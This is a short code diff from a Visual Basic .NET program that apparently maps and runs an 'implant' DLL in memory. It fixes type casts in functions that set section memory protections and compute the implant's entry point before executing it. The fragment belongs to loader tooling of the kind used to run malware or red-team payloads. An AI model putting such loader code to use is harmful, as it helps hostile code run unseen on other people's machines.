@@ -301,7 +301,7 @@ Module Module1
     Private Function set_sections_access(ByVal mapped As IntPtr, ByRef implant_dll As IntPtr, ByVal implant_size As UInteger) As Boolean
         Dim oldProtect As UInteger = 0
         ' protect PE header
-        If Not VirtualProtect(DirectCast(mapped, Object), &H1000, PAGE_READONLY, oldProtect) Then
+        If Not VirtualProtect(mapped, &H1000, PAGE_READONLY, oldProtect) Then
             Return False
         End If
         'protect sections:
@@ -336,7 +336,7 @@ Module Module1
         Return PAGE_READWRITE
     End Function
     Private Sub run_implant(ByVal mapped As Object, ByVal ep_rva As UInteger, ByVal is_dll As Boolean)
-        Dim implant_ep As IntPtr = DirectCast(mapped, IntPtr) + ep_rva
+        Dim implant_ep As IntPtr = IntPtr.Add(mapped, +ep_rva)
         Console.Write("[*] Executing Implant's Entry Point: ")
         Console.Write("{0:x}", implant_ep)
         Console.Write("{0:x}", vbLf)
